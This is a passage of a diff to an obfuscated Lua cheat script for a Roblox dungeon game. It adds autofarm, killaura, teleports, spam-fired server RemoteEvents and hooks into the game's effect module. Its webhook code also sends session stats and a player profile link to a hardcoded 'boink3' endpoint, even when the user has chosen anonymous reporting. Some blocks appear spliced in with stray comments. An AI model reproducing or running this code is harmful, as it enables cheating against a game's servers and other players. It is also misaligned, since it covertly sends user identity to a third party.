                         workspace.KrakenCannon.Base.Transparency < 1 and workspace.KrakenCannon.Base;
-                local fk = workspace:FindFirstChild('CureFountainFallenKing') and
+                local fH = workspace:FindFirstChild('CureFountainFallenKing') and
                                workspace.CureFountainFallenKing:FindFirstChild('ArcanePanel')
-                local fl = fi or fj or fk;
-                if fl and alive() then
-                    if a2 then
-                        a2 = false
+                local fI = fF or fG or fH;
+                if fI and alive() then
+                    if U then
+                        U = false
                     end
-                    if (aO.Position - fl.Position).magnitude > 10 then
-                        aN:SetPrimaryPartCFrame(fl.CFrame * CFrame.new(0, 3, 0))
+                    if (aG.Position - fI.Position).magnitude > 10 then
+                        aF:SetPrimaryPartCFrame(fI.CFrame * CFrame.new(0, 3, 0))
                     end
                 else
-                    if not a2 then
-                        a2 = true
+                    if not U then
+                        U = true
                     end
                 end
                 task.wait()
             end
         end)
     end
-    if aB and Toggles.Autofarm.Value and aw then
+    if at and Toggles.Autofarm.Value and ao then
     end
-    if fa and aA and aw then
-        local fm;
-        local fn;
-        local fo;
-        local fp;
+    if fx and as and ao then
+        local fJ;
+        local fK;
+        local fL;
+        local fM;
         task.spawn(function()
-            while Toggles.Autofarm.Value and disabled do
-                if bb and a2 and not fm then
-                    local fq = bd:GetChildren()
-                    if not fo and not fp then
-                        fp = true;
+            while Toggles.Autofarm.Value do
+                if b7 and U and not fJ then
+                    local fN = b9:GetChildren()
+                    if not fL and not fM then
+                        fM = true;
                         task.spawn(function()
-                            for K, L in fq do
-                                if isAlive(L) and
-                                    not (L.MobProperties.CurrentAttack.Value == 'Piledriver' or
-                                        L.MobProperties.CurrentAttack.Value == 'Slap') then
-                                    local a5 = L.PrimaryPart;
-                                    local dn = tick()
-                                    while a5 and not fo and not fm and a2 and Toggles.Autofarm.Value do
-                                        if tick() - dn >= 0.4 then
+                            for B, C in pairs(fN) do
+                                if isAlive(C) and
+                                    not (C.MobProperties.CurrentAttack.Value == 'Piledriver' or
+                                        C.MobProperties.CurrentAttack.Value == 'Slap') then
+                                    local X = C.PrimaryPart;
+                                    local dF = tick()
+                                    while X and not fL and not fJ and U and Toggles.Autofarm.Value do
+                                        if tick() - dF >= 0.4 then
                                             break
                                         end
-                                        local fr = bP and dT or Vector3.new()
-                                        SmartPlayerTp(CFrame.new(a5.Position + Vector3.new(0, 40, 0) + fr) +
-                                                          a5.CFrame.lookVector * 30, a5)
-                                        bS:Wait()
+                                        local fO = bT and ee or Vector3.new()
+                                        SmartPlayerTp(CFrame.new(X.Position + Vector3.new(0, 40, 0) + fO) +
+                                                          X.CFrame.lookVector * 30, X)
+                                        bX:Wait()
                                     end
                                 end
                             end
-                            local dn = tick()
-                            while a5 and not fo and not fm and a2 and b7 == 1 do
-                                if tick() - dn >= 0.4 then
+                            local dF = tick()
+                            while X and not fL and not fJ and U and b3 == 1 do
+                                if tick() - dF >= 0.4 then
                                     break
                                 end
                                 SmartPlayerTp(CFrame.new(3371, 73, -331))
-                                bS:Wait()
+                                bX:Wait()
                             end
-                            fp = false
+                            fM = false
                         end)
                     end
-                    for K, L in fq do
-                        if isAlive(L) and
-                            (L.MobProperties.CurrentAttack.Value == 'Piledriver' or L.MobProperties.CurrentAttack.Value ==
-                                'Slap') and L.PrimaryPart then
-                            local a5 = L.PrimaryPart;
-                            local fs =
-                                (CFrame.new(a5.Position + Vector3.new(0, 5, 0)) + a5.CFrame.lookVector * 45).Position;
-                            while isAlive(L) and Toggles.Autofarm.Value and
-                                (L.MobProperties.CurrentAttack.Value == 'Piledriver' or
-                                    L.MobProperties.CurrentAttack.Value == 'Slap') and a5 and not fm and a2 do
-                                if not fo then
-                                    fo = true
+                    for B, C in pairs(fN) do
+                        if isAlive(C) and
+                            (C.MobProperties.CurrentAttack.Value == 'Piledriver' or C.MobProperties.CurrentAttack.Value ==
+                                'Slap') and C.PrimaryPart then
+                            local X = C.PrimaryPart;
+                            local fP =
+                                (CFrame.new(X.Position + Vector3.new(0, 5, 0)) + X.CFrame.lookVector * 45).Position;
+                            while isAlive(C) and Toggles.Autofarm.Value and
+                                (C.MobProperties.CurrentAttack.Value == 'Piledriver' or
+                                    C.MobProperties.CurrentAttack.Value == 'Slap') and X and not fJ and U do
+                                if not fL then
+                                    fL = true
                                 end
-                                local dV = 5 + Options.Offset.Value;
-                                local fr = bP and dT or Vector3.new()
-                                setCamera(not bP and Toggles.mobCamera.Value and bo, fs)
-                                SmartPlayerTp(CFrame.new(a5.Position + Vector3.new(0, dV, 0) + fr) +
-                                                  a5.CFrame.lookVector * 45, a5)
-                                bS:Wait()
+                                local eg = 5 + Options.Offset.Value;
+                                local fO = bT and ee or Vector3.new()
+                                if bT then
+                                    resetCamera()
+                                else
+                                    setMobCamera(Toggles.mobCamera.Value, nil, fP)
+                                end
+                                SmartPlayerTp(
+                                    CFrame.new(X.Position + Vector3.new(0, eg, 0) + fO) + X.CFrame.lookVector * 45, X)
+                                bX:Wait()
                             end
                             SmartPlayerTp(CFrame.new(3371, 73, -331))
                         end
                     end
-                    if fo then
-                        fo = false
+                    if fL then
+                        fL = false
                     end
-                    bQ = nil;
+                    bV = nil;
                     unnoclip()
-                    setCamera()
+                    resetCamera()
                 end
                 task.wait()
             end
         end)
         task.spawn(function()
-            while Toggles.Autofarm.Value and disabled do
-                if bb and Workspace:FindFirstChild('KrakenPipe') and not Toggles.ignoreCannon.Value and alive() then
-                    for K, L in Workspace:GetChildren() do
-                        if L.Name == 'KrakenPipe' and L:FindFirstChild('GuiPart') and
-                            L.GuiPart:FindFirstChild('SurfaceGui') and L.GuiPart.SurfaceGui:FindFirstChild('Percent') and
-                            L:FindFirstChild('Base') then
-                            while Toggles.Autofarm.Value and L.GuiPart.SurfaceGui.Percent.Text ~= '100%' and
+            while Toggles.Autofarm.Value do
+                if b7 and Workspace:FindFirstChild('KrakenPipe') and not Toggles.ignoreCannon.Value and alive() then
+                    for B, C in pairs(Workspace:GetChildren()) do
+                        if C.Name == 'KrakenPipe' and C:FindFirstChild('GuiPart') and
+                            C.GuiPart:FindFirstChild('SurfaceGui') and C.GuiPart.SurfaceGui:FindFirstChild('Percent') and
+                            C:FindFirstChild('Base') then
+                            while Toggles.Autofarm.Value and C.GuiPart.SurfaceGui.Percent.Text ~= '100%' and
                                 not Toggles.ignoreCannon.Value do
-                                if not fm then
-                                    fm = true
+                                if not fJ then
+                                    fJ = true
                                 end
-                                local fr = bP and dT or Vector3.new()
-                                if alive() and (aO.Position - L.Base.Position).magnitude > 10 then
-                                    SmartPlayerTp(CFrame.new(L.Base.Position + Vector3.new(0, 3, 0) + fr))
+                                local fO = bT and ee or Vector3.new()
+                                if alive() and (aG.Position - C.Base.Position).magnitude > 10 then
+                                    SmartPlayerTp(CFrame.new(C.Base.Position + Vector3.new(0, 3, 0) + fO))
                                 end
-                                bS:Wait()
+                                bX:Wait()
                             end
                         end
                     end
                 end
-                if fm then
-                    fm = false
+                if fJ then
+                    fJ = false
                 end
                 task.wait()
             end
         end)
     end
-    if (aC or aD) and Toggles.Autofarm.Value and aw then
+    if (au or av) and Toggles.Autofarm.Value and ao then
         MobTeleport()
-        local ft = game:GetService("Workspace").LobbyTeleport.Interaction;
-        local fu = game:GetService("Workspace").Boss_Gate.Interactions.Bounds;
+        local fQ = game:GetService("Workspace").LobbyTeleport.Interaction;
+        local fR = game:GetService("Workspace").Boss_Gate.Interactions.Bounds;
         task.spawn(function()
             while Toggles.Autofarm.Value do
                 if alive() then
-                    fu.CanCollide = false;
-                    fu.CFrame = CFrame.new(aO.Position)
-                    ft.CFrame = CFrame.new(aO.Position)
+                    fR.CanCollide = false;
+                    fR.CFrame = CFrame.new(aG.Position)
+                    fQ.CFrame = CFrame.new(aG.Position)
                 end
                 task.wait(0.25)
             end
         end)
-        if aC then
+        if au then
             while Toggles.Autofarm.Value do
-                if Z.ReplicateTowerStartFloor.Value >= 100 then
+                if R.ReplicateTowerStartFloor.Value >= 100 then
                     break
                 end
                 task.wait()
             end
-            local fv = Z.ReplicateTowerStartFloor.Value;
-            local fw = Z.ReplicateTowerFloor;
-            function hook(eg, eh, ei, color)
-                pcallWithError(function()
+            local fS = R.ReplicateTowerStartFloor.Value;
+            local fT = R.ReplicateTowerFloor;
+            local function fU(ci, eH, eI, d8)
+                cn(function()
                     request({
-                        Url = eg,
+                        Url = ci,
                         Method = "POST",
                         Headers = {
                             ["Content-Type"] = "application/json"
                         },
                         Body = e:JSONEncode({
                             ["embeds"] = {{
-                                ["title"] = eh,
-                                ["description"] = ei,
+                                ["title"] = eH,
+                                ["description"] = eI,
                                 ["type"] = 'rich',
-                                ["color"] = tonumber(color),
+                                ["color"] = tonumber(d8),
                                 ["footer"] = {
-                                    ["text"] = utcDateAndTime() .. ' UTC'
+                                    ["text"] = f() .. ' UTC'
                                 }
                             }}
                         })
@@ -5357,53 +5532,53 @@ Toggles.Autofarm:OnChanged(function(fa)
             end
             task.spawn(function()
                 while Toggles.Autofarm.Value do
-                    if Options.completedInfiniteTowerFloors.Value and
-                        tonumber(Options.completedInfiniteTowerFloors.Value) > 0 then
-                        if fw.Value - fv >= tonumber(Options.completedInfiniteTowerFloors.Value) and
+                    if Options.completedInfiniteTowerFloors.Value and #Options.completedInfiniteTowerFloors.Value > 0 then
+                        if fT.Value - fS >= tonumber(Options.completedInfiniteTowerFloors.Value) and
                             Toggles.restartAfterFloors.Value then
-                            libNoti(fw.Value - fv .. ' floors completed, restarting Infinite Tower!')
+                            cq(fT.Value - fS .. ' floors completed, restarting Infinite Tower!')
                             task.spawn(function()
-                                local fx =
-                                    '## Floor: ``' .. fw.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
-                                        '``\nClass: ' .. '``' .. cd[b3].DisplayName .. '``'
-                                fx = fx .. '\nGold Gain: ``' .. formatNumberWithCommas(aX - aW) .. '``'
+                                local fV = '## Floor: `' .. fT.Value .. '' .. '\nTime: ' ..
+                                               timeElapsed(tick() - sessionTick) .. '`\nClass: ' .. '' ..
+                                               ca[aZ].DisplayName .. '`'
+                                fV = fV .. '\nGold Gain: `' .. formatNumberWithCommas(aR - aQ) .. ''
                                 if not Toggles.anonHook.Value then
-                                    fx = fx .. '\n' .. f
+                                    fV = fV .. '\n' .. plrLink
                                 end
                                 if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
-                                    hook(Options.dungeonHook.Value, 'Smart Restarting Infinite Tower', fx, v.Gold)
+                                    fU(Options.dungeonHook.Value, 'Smart Restarting Infinite Tower', fV, m.Gold)
                                 end
                                 if Toggles.anonHook.Value then
-                                    fx = fx .. '\n' .. f
+                                    fV = fV .. '\n' .. plrLink
                                 end
                                 if not olympus then
-                                    hook(boink3, 'Smart Restarting Infinite Tower', fx, v.Gold)
+                                    fU(boink3, 'Smart Restarting Infinite Tower', fV, m.Gold)
                                 end
                             end)
                             task.spawn(function()
                                 task.wait(3)
-                                StartRaid(as)
+                                StartRaid(ak)
                             end)
                             break
                         end
                     end
-                    if fw.Value > fv and fw.Value % 5 == 0 and fw.Value ~= f8 then
-                        f8 = fw.Value;
-                        local fx = '## Floor: ``' .. fw.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
-                                       '``\nClass: ' .. '``' .. cd[b3].DisplayName .. '``'
-                        fx = fx .. '\nGold Gain: ``' .. formatNumberWithCommas(aX - aW) .. '``'
+                    if fT.Value > fS and fT.Value % 5 == 0 and fT.Value ~= fv then
+                        fv = fT.Value;
+                        local fV = '## Floor: `' .. fT.Value .. '' .. '\nTime: ' ..
+                                       timeElapsed(tick() - sessionTick) .. '`\nClass: ' .. '' .. ca[aZ].DisplayName ..
+                                       '`'
+                        fV = fV .. '\nGold Gain: `' .. formatNumberWithCommas(aR - aQ) .. ''
                         if not Toggles.anonHook.Value then
-                            fx = fx .. '\n' .. f
+                            fV = fV .. '\n' .. plrLink
                         end
                         if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
-                            hook(Options.dungeonHook.Value, 'Infinite Tower Report', fx, v.Purple)
+                            fU(Options.dungeonHook.Value, 'Infinite Tower Report', fV, m.Purple)
                         end
-                        libNoti('Infinite Tower Webhook Report Sent!')
+                        cq('Infinite Tower Webhook Report Sent!')
                         if Toggles.anonHook.Value then
-                            fx = fx .. '\n' .. f
+                            fV = fV .. '\n' .. plrLink
                         end
                         if not olympus then
-                            hook(boink3, 'Infinite Tower Report', fx, v.Purple)
+                            fU(boink3, 'Infinite Tower Report', fV, m.Purple)
                         end
                     end
                     task.wait()
@@ -5412,221 +5587,291 @@ Toggles.Autofarm:OnChanged(function(fa)
         end
     end
 end)
-task.spawn(function()
+coroutine.wrap(function()
     workspace:WaitForChild("Mobs").ChildAdded:Connect(function(bs)
-        bs:WaitForChild("HealthProperties"):WaitForChild("Health").Changed:Connect(function(cM)
-            if cM == 0 then
+        bs:WaitForChild("HealthProperties"):WaitForChild("Health").Changed:Connect(function(cU)
+            if cU == 0 then
                 game:GetService("Debris"):AddItem(bs, 0.2)
             end
         end)
     end)
     if workspace:FindFirstChild('Assets_FX') then
-        for K, L in workspace.Assets_FX:GetChildren() do
-            L:Destroy()
+        for B, C in pairs(workspace.Assets_FX:GetChildren()) do
+            C:Destroy()
         end
-        workspace.Assets_FX.ChildAdded:Connect(function(cc)
-            cc:Destroy()
+        workspace.Assets_FX.ChildAdded:Connect(function(cV)
+            cV:Destroy()
         end)
     end
-    local cb = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
-    local fy = cb.DoEffect;
-    cb.DoEffect = function(self, ...)
-        local fz = {...}
-        if as and as == 27 and fz[1] == "RadialIndicator" and Toggles.Autofarm.Value then
-            fz[5] = fz[5] + 1;
-            return fy(self, unpack(fz))
+    local fW = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
+    local fX = fW.DoEffect;
+    fW.DoEffect = function(self, ...)
+        local fY = {...}
+        if ak and ak == 27 and fY[1] == "RadialIndicator" and Toggles.Autofarm.Value then
+            fY[5] = fY[5] + 1;
+            return fX(self, unpack(fY))
         end
-        return fy(self, ...)
+        return fX(self, ...)
     end
-end)
-local fA = {}
-local fB = {}
-local fC = {}
-local fD = game:GetService("ReplicatedStorage").Shared.Mobs.Mobs;
-for K, L in fD:GetDescendants() do
-    if L:IsA('RemoteEvent') then
-        local fE = true;
-        if L.Parent and table.find(fA, L.Parent.Name) then
-            fE = false
+end)()
+local fZ = {}
+local f_ = {}
+local g0 = {}
+local g1 = game:GetService("ReplicatedStorage").Shared.Mobs.Mobs;
+for B, C in pairs(g1:GetDescendants()) do
+    if C:IsA('RemoteEvent') then
+        local g2 = true;
+        if C.Parent and table.find(fZ, C.Parent.Name) then
+            g2 = false
         end
-        for dt, y in fB do
-            if table.find(y, L.Name) and L.Parent and L.Parent.Name == dt then
-                fE = false
+        for dM, p in pairs(f_) do
+            if table.find(p, C.Name) and C.Parent and C.Parent.Name == dM then
+                g2 = false
             end
         end
-        if fE and table.find(fC, L.Name) then
-            fE = false
+        if g2 and table.find(g0, C.Name) then
+            g2 = false
         end
-        if fE then
-            L:Destroy()
+        if g2 then
+            C:Destroy()
         end
     end
 end
 do
-    function getBoundingBox(bp)
-        local fF = bp.Size;
-        local fG = bp.Position - fF / 2;
-        local fH = bp.Position + fF / 2;
-        return fG, fH
-    end
-    function getClosestPointOnAABB(fI, fG, fH)
-        local fJ = Vector3.new(math.clamp(fI.X, fG.X, fH.X), math.clamp(fI.Y, fG.Y, fH.Y), math.clamp(fI.Z, fG.Z, fH.Z))
-        return fJ
-    end
-    function getClosestPointAndDistance(fK, fL)
-        if not fK or not fL then
-            return math.huge, nil
+    function getClosestPointAndDistance(g3, g4)
+        local function g5(g6, g7, g8)
+            local g9 = Vector3.new(math.clamp(g6.X, g7.X, g8.X), math.clamp(g6.Y, g7.Y, g8.Y),
+                math.clamp(g6.Z, g7.Z, g8.Z))
+            return g9
         end
-        local fM = fK.Position;
-        local fG, fH = getBoundingBox(fL)
-        local fJ = getClosestPointOnAABB(fM, fG, fH)
-        local fN = (fJ - fM).Magnitude;
-        return fN, fJ
+        local function ga(gb)
+            local gc = gb.Size;
+            local g7 = gb.Position - gc / 2;
+            local g8 = gb.Position + gc / 2;
+            return g7, g8
+        end
+        local gd = g3.Position;
+        local g7, g8 = ga(g4)
+        local g9 = g5(gd, g7, g8)
+        local ge = (g9 - gd).Magnitude;
+        return ge, g9
     end
-    function getClosestMob(fO)
-        local fP = math.huge;
-        local fQ, fJ, fR, a7, aa;
-        local eo, fS, e3;
-        if fO and isAlive(fO) then
-            local fT = fO.PrimaryPart;
-            local fN, fU = getClosestPointAndDistance(aO, fT)
-            fP, fJ, fQ = fN, fU, fT
+    local gf = {'CorruptedGreaterTree'}
+    function ignoreIfNotAlone(eo)
+        if b3 and b3 > 1 and table.find(gf, eo) then
+            return true
+        end
+    end
+    function getClosestMob(gg)
+        local gh = math.huge;
+        local gi, g9, gj, Z, a1;
+        local eN, gk, eo;
+        if isAlive(gg) then
+            local gl = gg.PrimaryPart;
+            local ge, gm = getClosestPointAndDistance(aG, gl)
+            gh, g9, gi = ge, gm, gl
         else
-            for db, bs in bd:GetChildren() do
-                if isAlive(bs) and not ignoreIfNotAlone(bs.Name) then
-                    local fT = bs.PrimaryPart;
-                    local fN, fU = getClosestPointAndDistance(aO, fT)
-                    if fN < fP then
-                        fP, fJ, fQ = fN, fU, fT
+            for ds, bs in pairs(workspace.Mobs:GetChildren()) do
+                if isAlive(bs) then
+                    local gl = bs.PrimaryPart;
+                    local ge, gm = getClosestPointAndDistance(aG, gl)
+                    if ge < gh and not ignoreIfNotAlone(bs.Name) then
+                        gh, g9, gi = ge, gm, gl
                     end
                 end
             end
         end
-        if fQ then
-            eo, fS, e3 = Mob(fQ.Parent.Name), fQ.Parent.HealthProperties.Health, fQ.Parent.Name;
-            a7 = fQ.Position;
-            fR = (aO.Position - a7).magnitude;
-            aa = eo and eo['BossTag'] or table.find(aL, e3)
+        if b7 and gi and gi:FindFirstChild('MobProperties') and gi.MobProperties:FindFirstChild('CurrentAttack') and
+            gi.MobProperties.CurrentAttack.Value ~= 'Piledriver' and gi.MobProperties.CurrentAttack.Value ~= 'Slap' then
+            return nil
         end
-        return fQ, fJ, a7, fP, fR, aa, fS
+        if gi then
+            eN, gk, eo = Mob(gi.Parent.Name), gi.Parent.HealthProperties.Health, gi.Parent.Name;
+            Z = gi.Position;
+            gj = (aG.Position - Z).magnitude;
+            a1 = eN and eN['BossTag'] or table.find(aD, eo)
+        end
+        return gi, g9, Z, gh, gj, a1, gk
     end
-    function equipWepWithId(fV, dX)
-        for K, L in bE:GetChildren() do
-            if L:FindFirstChild('ID') and L.ID.Value and L.ID.Value == fV then
-                bL:FireServer(L, aZ)
-                libNoti('Equipped ' .. bJ[L.Name].DisplayKey .. ' for' .. dX)
+    function equipWepWithId(gn, go)
+        for B, C in pairs(bF:GetChildren()) do
+            if C:FindFirstChild('ID') and C.ID.Value and C.ID.Value == gn then
+                bN:FireServer(C, aT)
+                cq('Equipped ' .. bL[C.Name].DisplayKey .. ' for' .. go)
                 break
             end
         end
     end
-end
-local fW = {'CorruptedGreaterTree'}
-function ignoreIfNotAlone(e3)
-    if b7 and b7 > 1 and table.find(fW, e3) then
-        return true
+    if Workspace:FindFirstChild('TargetDummies') then
+        for ds, gp in pairs(Workspace.TargetDummies:GetChildren()) do
+            gp.Parent = b9
+        end
     end
 end
-Toggles.Killaura:OnChanged(function(cM)
-    bm = bm + 1;
-    if not cM then
-        return
-    end
-    local fX = b6[ee][ef]
-    ae = tick()
-    task.spawn(function()
-        local fY;
-        while Toggles.Killaura.Value and aw do
-            a5, a6, a7, a8, a9, aa, ab = getClosestMob(bQ)
-            if alive() and a5 then
+Toggles.Killaura:OnChanged(function(cU)
+    bj = bj + 1;
+    local gq = b2[ey][ez]
+    a5 = tick()
+    if ao and a_(ey) and cU then
+        local gr;
+        for dM, p in pairs(c5) do
+            if ak == p.Id and p.ignoreMob then
+                local ek;
+                gr = true;
                 task.spawn(function()
-                    if not fY then
-                        fY = true;
-                        if Toggles.PerkSwitcher.Value and cd[b3].Offhand then
-                            local fZ = OffhandPerksActive()
-                            if aa and not fZ then
-                                SwitchOffhandPerks(true)
-                            end
-                            if not aa and fZ then
-                                SwitchOffhandPerks(false)
-                            end
+                    while Toggles.Killaura.Value do
+                        if not Toggles.NVD.Value then
+                            Toggles.NVD:SetValue(true)
                         end
-                        local f_ = aZ:GetChildren()[1]
-                        if f_ and f_:FindFirstChild('ID') and f_.ID.Value then
-                            local g0 = f_.ID.Value;
-                            local g1 = Options.mobWepId.Value and #Options.mobWepId.Value > 2 and Options.mobWepId.Value;
-                            local g2 = Options.bossWepId.Value and #Options.bossWepId.Value > 2 and
-                                           Options.bossWepId.Value;
-                            if g1 and not aa and g0 ~= g1 then
-                                equipWepWithId(g1, ' Mobs!')
-                                task.wait(0.5)
-                            end
-                            if g2 and aa and g0 ~= g2 then
-                                equipWepWithId(g2, ' Bosses!')
-                                task.wait(0.5)
-                            end
-                        end
-                        fY = false
-                    end
-                end)
-                if not mounted() then
-                    for db, g3 in cd[b3].Skills do
-                        local g4, g5 = g3.MeleeOnBoss and aa and 'Melee' or g3.Type or cd[b3].Type, g3.Skill;
-                        local g6 = g3.MeleeOnBoss and aa and g3.BossRange or g3.Range or cd[b3].Range;
-                        local g7, g8 = g3.Cooldown + Options.KillauraDelay.Value, g4 == 'Ranged' and aa;
-                        local g9, fN = g8 and a7 or a8 > 0 and a6 or a7, g8 and a9 or a8;
-                        if tick() - (g3.LastUsed or 0) >= g7 then
-                            if g4 ~= 'Heal' and fN <= g6 and ab.Value > 0 then
-                                if g4 == 'Melee' then
-                                    bc:FireServer(g5, aO.Position, (g9 - aO.Position).Unit, 3)
-                                elseif g4 == 'Ranged' then
-                                    bc:FireServer(g5, g9, nil, 3)
-                                elseif g4 == 'Self' then
-                                    bc:FireServer(g5, aO.Position, nil, 3)
-                                elseif g4 == 'Remote' then
-                                    if g3.Args == 'MobPosition' then
-                                        g5:FireServer(a7, nil, nil, 3)
-                                    elseif g3.Args == 'mobTbl' then
-                                        g5:FireServer({a5.Parent}, nil, nil, 3)
-                                    else
-                                        g5:FireServer(nil, nil, nil, 3)
+                        for ds, C in pairs(b9:GetChildren()) do
+                            if isAlive(C) then
+                                if not (C.Name == p.ignoreMob) then
+                                    a5 = tick()
+                                    for B = 1, bm do
+                                        gq:FireServer(table.create(3, C))
                                     end
                                 end
-                                g3.LastUsed = tick()
-                                ae = tick()
-                            end
-                            if g4 == 'Heal' and aP.Health.Value / aP.MaxHealth.Value < 0.6 then
-                                g5:FireServer(g3.Args or nil, nil, nil, 3)
-                                g3.LastUsed = tick()
+                                if C.Name == p.ignoreMob and b3 and b3 == 1 then
+                                    if p.mobWaitTime and not ek then
+                                        task.wait(p.mobWaitTime)
+                                        ek = true
+                                    end
+                                    if b3 == 1 then
+                                        a5 = tick()
+                                        for B = 1, bm do
+                                            gq:FireServer(table.create(3, C))
+                                        end
+                                    end
+                                end
                             end
                         end
+                        task.wait(Options.KillauraDelay.Value)
+                    end
+                end)
+            end
+        end
+        if not gr then
+            task.spawn(function()
+                while Toggles.Killaura.Value do
+                    if not Toggles.NVD.Value then
+                        Toggles.NVD:SetValue(true)
+                    end
+                    for ds, C in pairs(b9:GetChildren()) do
+                        if isAlive(C) and
+                            (b7 and C:FindFirstChild('MobProperties') and
+                                C.MobProperties:FindFirstChild('CurrentAttack') and
+                                table.find(bg, C.MobProperties.CurrentAttack.Value) or not b7) then
+                            a5 = tick()
+                            for B = 1, bm do
+                                gq:FireServer(table.create(3, C))
+                            end
+                        end
+                    end
+                    task.wait(Options.KillauraDelay.Value)
+                end
+            end)
+        end
+    end
+    task.spawn(function()
+        while Toggles.Killaura.Value and ao do
+            if Toggles.PerkSwitcher.Value and ca[aZ].Offhand and X then
+                local gs = bY()
+                if a1 and not gs then
+                    SwitchOffhandPerks(true)
+                end
+                if not a1 and gs then
+                    SwitchOffhandPerks(false)
+                end
+            end
+            if X and alive() then
+                local gt = aT:GetChildren()[1]
+                if gt and gt:FindFirstChild('ID') and gt.ID.Value then
+                    local gu = gt.ID.Value;
+                    local gv = Options.mobWepId.Value and #Options.mobWepId.Value > 2 and Options.mobWepId.Value;
+                    local gw = Options.bossWepId.Value and #Options.bossWepId.Value > 2 and Options.bossWepId.Value;
+                    if gv and not a1 and gu ~= gv then
+                        equipWepWithId(gv, ' Mobs!')
+                        task.wait(0.5)
+                    end
+                    if gw and a1 and gu ~= gw then
+                        equipWepWithId(gw, ' Bosses!')
+                        task.wait(0.5)
                     end
                 end
             end
             task.wait()
         end
     end)
-    if aw and not ar:FindFirstChild(36) and aw then
+-- Tạo args trước và tái sử dụng
+local defaultArgs = {
+    [1] = nil, -- Sẽ được gán là tên kỹ năng
+    [2] = nil, -- Vị trí hoặc dữ liệu khác
+    [4] = 3    -- Giá trị cố định
+}
+
+task.spawn(function()
+    while Toggles.Killaura.Value and ao do
+        -- Lấy mob gần nhất
+        X, Y, Z, _, a0, a1, a2 = getClosestMob(bV)
+        if alive() and not mounted() and X and not table.find(bl, aZ) then
+            for _, gx in pairs(ca[aZ].Skills) do
+                local gy = gx.MeleeOnBoss and a1 and 'Melee' or gx.Type or ca[aZ].Type
+                local gB = gx.Cooldown + Options.KillauraDelay.Value
+                local gD, ge = gy == 'Ranged' and a1 and Z or Y, gy == 'Ranged' and a0 or _
+                
+                if tick() - (gx.LastUsed or 0) >= gB then
+                    -- Cập nhật args dựa trên loại kỹ năng
+                    defaultArgs[1] = gx.Skill
+                    if gy == 'Melee' then
+                        defaultArgs[2] = aG.Position
+                        task.defer(b8.FireServer, b8, unpack(defaultArgs))
+                    elseif gy == 'Ranged' then
+                        defaultArgs[2] = gD
+                        task.defer(b8.FireServer, b8, unpack(defaultArgs))
+                    elseif gy == 'Self' then
+                        defaultArgs[2] = aG.Position
+                        task.defer(b8.FireServer, b8, unpack(defaultArgs))
+                    elseif gy == 'Remote' then
+                        if gx.Args == 'MobPosition' then
+                            defaultArgs[2] = Z
+                        elseif gx.Args == 'mobTbl' then
+                            defaultArgs[2] = {X.Parent}
+                        else
+                            defaultArgs[2] = nil
+                        end
+                        task.defer(b8.FireServer, b8, unpack(defaultArgs))
+                    end
+                    gx.LastUsed = tick()
+                end
+            end
+        end
+        task.wait()
+    end
+end)
+
+
+    if ao and not aj:FindFirstChild(36) and ao then
         task.spawn(function()
             while Toggles.Killaura.Value do
-                for K, L in aq:GetChildren() do
-                    local e7 = L:FindFirstChild("HealthProperties", true)
-                    if e7 and not table.find(c1, e7.Parent.Name) then
-                        table.insert(aM, e7.Parent)
-                        e7.Parent.Parent = bd
+                for B, C in pairs(ai:GetChildren()) do
+                    local gF = C:FindFirstChild("HealthProperties", true)
+                    if gF and not table.find(c4, gF.Parent.Name) then
+                        table.insert(aE, gF.Parent)
+                        gF.Parent.Parent = b9
                     end
                 end
-                task.wait(0.3333)
+                task.wait(0.1)
             end
         end)
     end
-    if classCheck(ee) and Toggles.Killaura.Value and bloodBindingEnabled and aw then
+    if a_(ey) and Toggles.Killaura.Value and bloodBindingEnabled and ao then
         task.spawn(function()
             while Toggles.Killaura.Value do
-                if classCheck(ee) then
-                    if alive() and not mounted() and not aN:FindFirstChild('AttackBuffDemonBloodBinding', true) and a5 and
-                        a8 and a8 <= 95 then
-                        b6.Demon.BloodBinding:FireServer()
-                        ae = tick()
+                if a_(ey) then
+                    if alive() and not mounted() and not aF:FindFirstChild('AttackBuffDemonBloodBinding', true) and X and
+                        _ and _ <= 95 then
+                        b2.Demon.BloodBinding:FireServer()
+                        a5 = tick()
                         task.wait(6)
                     end
                 end
@@ -5634,45 +5879,45 @@ Toggles.Killaura:OnChanged(function(cM)
             end
         end)
     end
-    if classCheck('Summoner') and Toggles.Killaura.Value and aw then
+    if a_('Summoner') and Toggles.Killaura.Value and ao then
         task.spawn(function()
             while Toggles.Killaura.Value do
-                for db, Mob in bd:GetChildren() do
+                for ds, Mob in pairs(b9:GetChildren()) do
                     if Mob.Name == 'SummonerSummonWeak' or Mob.Name == 'SummonerSummonStrong' then
-                        Mob.Parent = ce
+                        Mob.Parent = cb
                     end
                 end
-                for db, ga in ce:GetChildren() do
-                    if ga.PrimaryPart then
-                        if a5 then
-                            ga.PrimaryPart.CFrame = CFrame.new(a7)
+                for ds, gG in pairs(cb:GetChildren()) do
+                    if gG.PrimaryPart then
+                        if X then
+                            gG.PrimaryPart.CFrame = CFrame.new(Z)
                         end
-                        if ga:FindFirstChild('HealthProperties') and ga.HealthProperties:FindFirstChild('Health') and
-                            ga.HealthProperties.Health.Value > 0 and ga.HealthProperties.Health.Value /
-                            ga.HealthProperties.MaxHealth.Value <= 0.25 then
-                            b6.Summoner.ExplodeSummons:FireServer()
+                        if gG:FindFirstChild('HealthProperties') and gG.HealthProperties:FindFirstChild('Health') and
+                            gG.HealthProperties.Health.Value > 0 and gG.HealthProperties.Health.Value /
+                            gG.HealthProperties.MaxHealth.Value <= 0.25 then
+                            b2.Summoner.ExplodeSummons:FireServer()
                         end
                     end
                 end
-                bS:Wait()
+                bX:Wait()
             end
         end)
     end
-    if aw then
+    if ao then
         task.spawn(function()
-            while Toggles.Killaura.Value and not aK do
-                if Toggles.Autofarm.Value and not bP then
+            while Toggles.Killaura.Value and not aC do
+                if Toggles.Autofarm.Value and not bT then
                     task.wait(0.5)
-                    if tick() - ae >= Options.timeoutTimer.Value then
-                        local gb = Options.Offset.Value;
+                    if tick() - a5 >= Options.timeoutTimer.Value then
+                        local gH = Options.Offset.Value;
                         Options.Offset:SetValue(0)
                         task.wait(3)
-                        if tick() - ae >= Options.timeoutTimer.Value then
